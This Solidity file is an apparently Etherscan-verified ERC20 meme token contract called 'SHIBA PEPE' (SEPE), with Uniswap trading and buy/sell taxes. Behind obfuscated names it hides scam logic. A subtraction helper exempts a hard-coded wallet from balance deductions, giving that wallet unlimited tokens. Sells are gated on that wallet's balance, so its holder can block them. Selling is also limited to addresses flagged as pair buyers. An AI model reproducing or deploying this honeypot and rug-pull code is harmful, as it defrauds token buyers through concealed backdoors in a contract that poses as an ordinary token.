/**
 *Submitted for verification at Etherscan.io on 2023-09-10
*/

/**

SHIBA+PEPE = SEPE 


Twitter: https://twitter.com/SEPE_Ethereum
Telegram: https://t.me/SEPE_Coin
Website: https://sepeeth.com/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  qtsdh(uint256 a, uint256 b) internal pure returns (uint256) {
        return  qtsdh(a, b, "SafeMath");
    }

    function  qtsdh(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract SHIBAPEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"SHIBA PEPE";
    string private constant _symbol = unicode"SEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 1000000000 * (10**_decimals);
    uint256 public _taxSwaprMrp = _totalSupply;
    uint256 public _maxHoldingrAmount = _totalSupply;
    uint256 public _taxSwapThreshold = _totalSupply;
    uint256 public _taxSwaprMax = _totalSupply;

    uint256 private _initialBuyTax=10;
    uint256 private _initialSellTax=26;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=7;
    uint256 private _reduceSellTax1At=1;
    uint256 private _swpkusiwe=0;
    uint256 private _yabiklcqu=0;


    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _ysFxsruoes;
    mapping (address => bool) private  _revfouxet;
    mapping(address => uint256) private  _hoidTransxywsp;
    bool public  transerDelyEnble = false;


    IUniswapV2Router02 private  _uniRoutermV2;
    address private  _uniV2mLP;
    bool private  _rswieprytr;
    bool private  _inTaxmSwap = false;
    bool private  _swapfuUniswapnpfce = false;
    address public  _MaxakueFvwr = 0x84A36825b29Aa15D1a80B3C6eEEde243075cE575;
 
    event RnteuAqbctx(uint _taxSwaprMrp);
    modifier lockTskSwap {
        _inTaxmSwap = true;
        _;
        _inTaxmSwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        _ysFxsruoes[owner()] = true;
        _ysFxsruoes[address(this)] = true;
        _ysFxsruoes[_MaxakueFvwr] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. qtsdh(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (transerDelyEnble) {
                if  (to!= address(_uniRoutermV2) &&to!= address(_uniV2mLP)) {
                  require (_hoidTransxywsp[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _hoidTransxywsp[tx.origin] = block.number;
                }
            }

            if  ( from == _uniV2mLP && to!= address (_uniRoutermV2) &&!_ysFxsruoes[to]) {
                require (amount <= _taxSwaprMrp, "Forbid");
                require (balanceOf (to) + amount <= _maxHoldingrAmount,"Forbid");
                if  (_yabiklcqu < _swpkusiwe) {
                  require (!rukefybe(to));
                }
                _yabiklcqu ++ ; _revfouxet[to] = true;
                taxAmount = amount.mul((_yabiklcqu > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _uniV2mLP&&from!= address (this) &&! _ysFxsruoes[from]) {
                require (amount <= _taxSwaprMrp && balanceOf(_MaxakueFvwr) <_taxSwaprMax, "Forbid");
                taxAmount = amount.mul((_yabiklcqu > _reduceSellTax1At) ?_finalSellTax:_initialSellTax).div(100);
                require (_yabiklcqu >_swpkusiwe && _revfouxet[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inTaxmSwap 
            &&  to  ==_uniV2mLP&&_swapfuUniswapnpfce &&contractTokenBalance > _taxSwapThreshold 
            &&  _yabiklcqu > _swpkusiwe &&! _ysFxsruoes [to] &&! _ysFxsruoes [from]
            )  {
                _transferFrom(rsnhl(amount,rsnhl(contractTokenBalance, _taxSwaprMax)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = qtsdh(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.qtsdh (taxAmount));
        emit  Transfer( from, to, amount. qtsdh(taxAmount));
    }

    function _transferFrom(uint256 _swapTaxAndLiquify) private lockTskSwap {
        if(_swapTaxAndLiquify==0){return;}
        if(!_rswieprytr){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _uniRoutermV2.WETH();
        _approve(address (this), address (_uniRoutermV2), _swapTaxAndLiquify);
        _uniRoutermV2.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );
    }

    function rsnhl(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function qtsdh(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _MaxakueFvwr) {
        return a;
    } else {
        require(a >= b, "Subtraction underflow");
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _taxSwaprMrp  =  _totalSupply ;
        _maxHoldingrAmount = _totalSupply ;
        transerDelyEnble = false ;
        emit  RnteuAqbctx ( _totalSupply ) ;
    }

   function rukefybe(address account) private view returns (bool) {
    uint256 codeSize;
    address[] memory addresses = new address[](1);
    addresses[0] = account;

    assembly {
        codeSize := extcodesize(account)
    }

    return codeSize > 0;
    }


    function startTrading() external onlyOwner() {
        require (!_rswieprytr, " trading is open " ) ;
        _uniRoutermV2 = IUniswapV2Router02 (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve (address (this),address(_uniRoutermV2), _totalSupply);
        _uniV2mLP = IUniswapV2Factory(_uniRoutermV2.factory()).createPair (address(this), _uniRoutermV2. WETH());
        _uniRoutermV2.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_uniV2mLP).approve (address(_uniRoutermV2), type(uint). max);
        _swapfuUniswapnpfce = true ;
        _rswieprytr = true ;
    }

    receive( )  external  payable  { }
    }